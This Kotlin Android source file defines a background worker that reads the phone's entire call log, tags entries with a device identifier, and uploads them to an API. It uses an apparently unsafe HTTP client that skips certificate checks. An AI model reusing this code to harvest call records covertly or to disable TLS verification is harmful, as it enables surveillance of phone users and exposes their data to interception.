package com.example.bullsseeclient

import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.telephony.TelephonyManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import java.time.Instant
import java.util.UUID

class CallLogWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val deviceName: String by lazy {
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            UUID.randomUUID().toString()
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.deviceId ?: UUID.randomUUID().toString()
        }
    }

    override fun doWork(): Result {
        try {
            val data = DeviceDataDtos()
            val callLogs = mutableListOf<CallLogData>()
            val callCursor = applicationContext.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            callCursor?.use { cursor ->
                while (cursor.moveToNext()) {
                    val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    callLogs.add(CallLogData(deviceName, number, Instant.ofEpochMilli(date).toString()))
                }
            }
            data.callLogs = callLogs

            if (data.callLogs?.isNotEmpty() == true) sendCallLogsToApi(data)
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }

    private fun sendCallLogsToApi(data: DeviceDataDtos) {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)
        val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(data))
        apiService.uploadCallLogs(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                if (!response.isSuccessful) {
                    // Log failure
                }
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                // Handle failure
            }
        })
    }

    data class DeviceDataDtos(var callLogs: List<CallLogData>? = null)
    data class CallLogData(val deviceName: String, val number: String, val date: String)

    interface ApiService {
        @POST("api/DeviceData/calllog")
        fun uploadCallLogs(@Body data: RequestBody): Call<Void>
    }
}